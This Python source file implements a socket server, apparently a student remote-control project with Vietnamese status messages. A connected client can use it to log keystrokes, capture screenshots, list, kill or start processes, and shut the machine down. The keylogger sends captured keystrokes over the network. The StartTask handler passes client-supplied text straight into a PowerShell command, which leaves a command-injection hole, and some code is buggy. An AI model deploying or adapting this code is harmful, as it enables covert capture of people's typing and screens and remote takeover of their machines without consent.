from threading import Thread
import pyautogui
import socket
import os
from pynput.keyboard import Key, Listener, Controller
import constants
import subprocess


class ServerFeatures:
    client = None
    server = None

    class Keystroke:
        def __init__(self):
            self.Keyboards = Controller()
            self.Stop = True
            self.ListKeys = []


        def StopHook(self):
            while True:
                if self.Stop:
                    try:
                        while True:
                            checkdata = ServerFeatures.client.recv(1024).decode("utf-8")
                            if checkdata == "UnhookKey":
                                self.Stop = False
                                break
                    finally:
                        self.Keyboards.release(Key.space)
                break


        def KeyLogger(self):
            while True:
                # key pressed
                def Pressing(logger):
                    self.ListKeys.append(logger)

                def Releasing(logger):
                    # Loop stop condition
                    if not self.Stop:
                        listener.stop()

                with Listener(on_release=Releasing, on_press=Pressing) as listener:
                    listener.join()

                def Writing():
                    global count
                    logging = ''
                    count = 0
                    for logger in self.ListKeys:
                        temp = str(logger).replace("'", "")

                        if (str(temp) == "Key.space"):
                            temp = " "
                        elif (str(temp) == "Key.backspace"):
                            temp = "Backspace"
                        elif (str(temp) == "Key.shift"):
                            temp = ""

                        temp = str(temp).replace("Key.", '')
                        temp = str(temp).replace("Key.cmd", "")

                        if (str(temp) == "<96>"):
                            temp = "0"
                        elif (str(temp) == "<97>"):
                            temp = "1"
                        elif (str(temp) == "<98>"):
                            temp = "2"
                        elif (str(temp) == "<99>"):
                            temp = "3"
                        elif (str(temp) == "<100>"):
                            temp = "4"
                        elif (str(temp) == "<101"):
                            temp = "5"
                        elif (str(temp) == "<102>"):
                            temp = "6"
                        elif (str(temp) == "<103>"):
                            temp = "7"
                        elif (str(temp) == "<104>"):
                            temp = "8"
                        elif (str(temp) == "<105>"):
                            temp = "9"

                        temp = str(temp).replace("<home>", "Home")
                        temp = str(temp).replace("<esc>", "ESC")
                        temp = str(temp).replace("<tab>", "")
                        temp = str(temp).replace("<cmd>", "fn")
                        temp = str(temp).replace("<enter>", "Enter")
                        temp = str(temp).replace("<caps_lock>", "")
                        temp = str(temp).replace("<shift_l>", "")
                        temp = str(temp).replace("<shift_r>", "")
                        temp = str(temp).replace("<ctrl_l>", "")
                        temp = str(temp).replace("<num_lock>", "")
                        temp = str(temp).replace("<ctrl_r>", "")
                        temp = str(temp).replace("<alt_l>", "")
                        temp = str(temp).replace("<alt_gr>", "")
                        temp = str(temp).replace("<delete>", "Del")
                        temp = str(temp).replace("<print_screen>", "PrtSc")

                        temp = str(temp).replace("home", "Home")
                        temp = str(temp).replace("esc", "ESC")
                        temp = str(temp).replace("tab", "")
                        temp = str(temp).replace("cmd", "fn")
                        temp = str(temp).replace("enter", "Enter")
                        temp = str(temp).replace("caps_lock", "")
                        temp = str(temp).replace("shift_l", "")
                        temp = str(temp).replace("shift_r", "")
                        temp = str(temp).replace("ctrl_l", "")
                        temp = str(temp).replace("num_lock", "")
                        temp = str(temp).replace("ctrl_r", "")
                        temp = str(temp).replace("alt_l", "")
                        temp = str(temp).replace("alt_gr", "")
                        temp = str(temp).replace("delete", "Del")
                        temp = str(temp).replace("print_screen", "PrtSc")

                        logging += temp
                        count += 1
                        print(logging)
                    return logging[0:]

                data = Writing()
                if data == "":
                    data = " "
                print('Data: ',data)
                ServerFeatures.client.sendall(bytes(data, "utf-8"))
                checkdata = ServerFeatures.client.recv(1024).decode("utf-8")
                self.ListKeys.clear()
                break


        def KeystrokeRun(self):
            ServerFeatures.client.sendall(bytes("Đã nhận", "utf-8"))
            threadingLogger = Thread(target=self.KeyLogger)
            threadingStop = Thread(target=self.StopHook)
            threadingStop.start()
            threadingLogger.start()
            threadingLogger.join()

    @classmethod
    def KillTask(cls):
        m = cls.client.recv(1024)
        pid = int(m)
        print("Killed ", str(pid))
        subprocess.check_output("Taskkill /PID %d /F" % pid)

        cls.client.send(bytes("Killed", "utf-8"))

    @classmethod
    def StartTask(cls):
        import subprocess
        m = ServerFeatures.client.recv(1024)
        msg = str(m)
        msg = msg[2:]
        msg = msg[:len(msg) - 1]
        print(str(msg))
        print("C:/Windows/System32/" + msg + ".exe")
        cmd = 'powershell start ' + msg
        subprocess.call(cmd)
        cls.client.send(bytes("Started", "utf-8"))

    @classmethod
    def Process(cls):
        import subprocess
        cmd = 'powershell "Get-Process |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
        ProccessProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        count = 0
        length = 0
        Name = ['' for i in range(10000)]
        ID = ['' for i in range(10000)]
        Thread = ['' for i in range(10000)]
        for line in ProccessProc.stdout:
            if line.rstrip():
                if count < 2:
                    count += 1
                    continue
                msg = str(line.decode().rstrip().lstrip())
                msg = " ".join(msg.split())
                lists = msg.split(" ", 3)
                ID[length] = lists[0]
                Name[length] = lists[1]
                Thread[length] = lists[2]
                length += 1

        cls.client.sendall(bytes(str(length), "utf-8"))

        for i in range(length):
            cls.client.sendall(bytes(ID[i], "utf-8"))
            checkdata = cls.client.recv(1024)

        for i in range(length):
            cls.client.sendall(bytes(Name[i], "utf-8"))
            checkdata = cls.client.recv(1024)

        for i in range(length):
            cls.client.sendall(bytes(Thread[i], "utf-8"))
            checkdata = cls.client.recv(1024)

    @classmethod
    def Application(cls):
        import subprocess
        cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
        appProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        count = 0
        length = 0
        Name = ['' for i in range(100)]
        ID = ['' for i in range(100)]
        Thread = ['' for i in range(100)]
        for line in appProc.stdout:
            if line.rstrip():
                if count < 2:
                    count += 1
                    continue
                msg = str(line.decode().rstrip().lstrip())
                msg = " ".join(msg.split())
                lists = msg.split(" ", 3)
                ID[length] = lists[0]
                Name[length] = lists[1]
                Thread[length] = lists[2]
                length += 1

        cls.client.sendall(bytes(str(length), "utf-8"))

        for i in range(length):
            cls.client.sendall(bytes(ID[i], "utf-8"))
            checkdata = cls.client.recv(1024)

        for i in range(length):
            cls.client.sendall(bytes(Name[i], "utf-8"))
            checkdata = cls.client.recv(1024)

        for i in range(length):
            cls.client.sendall(bytes(Thread[i], "utf-8"))
            checkdata = cls.client.recv(1024)

    @classmethod
    def ShutDown(cls):
        os.system("shutdown /s /t 30")
        cls.client.send(bytes("Da tat may", "utf-8"))

    @classmethod
    def TakePicture(cls):
        image = pyautogui.screenshot()
        image.save("scrshot.png")
        try:

            myfile = open('scrshot.png', 'rb')
            bytess = myfile.read()

            cls.client.sendall(bytess)
            myfile.close()
        except:
            print("Can't capture screenshots")

    # Receive request from client
    @classmethod
    def readRequest(cls):
        request = ""
        try:
            request = cls.client.recv(1024).decode('utf-8')
        finally:
            return request

    # Choose option from request
    @classmethod
    def takeRequest(cls):
        while True:
            Request = cls.readRequest()
            if not Request:
                cls.client.close()
                break
            print("Request from client:")
            # take a picture
            if "TakePicture" == Request:
                cls.TakePicture()

            # Shutdown the computer
            elif "Shutdown" == Request:
                cls.ShutDown()

            # List the processes running in the computer
            elif "ProcessRunning" == Request:
                cls.Process()

            # List the application running in the computer
            elif "AppRunning" == Request:
                cls.Application()

            # Stop a process/application
            elif "KillTask" == Request:
                cls.KillTask()
            # Start a process/application
            elif "StartTask" == Request:
                cls.StartTask()
            # catch a keys
            elif "HookKey" == Request:
                ServerFeatures.Keystroke().KeystrokeRun()
            # close the program
            elif "Close" == Request:
                cls.server.close()

    @classmethod
    def Serveur(cls):
        try:
            cls.server.listen()
            ACCEPT_THREAD = Thread(target=cls.waitingConnection())
            ACCEPT_THREAD.start()
            ACCEPT_THREAD.join()
        except:
            print("ERROR!")
        finally:
            cls.server.close()

    # wait to connect for client
    @classmethod
    def waitingConnection(cls):
        print("Waiting for Client")

        while True:
            cls.client, Address = cls.server.accept()
            print("Client", Address, "connected!")
            Thread(target=cls.takeRequest, args=()).start()

    @classmethod
    def setUpServer(cls):
        print("Server IP Address Now ", (socket.gethostbyname(socket.gethostname())))
        cls.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cls.server.bind((socket.gethostbyname(socket.gethostname()), constants.PORT))
        cls.Serveur()
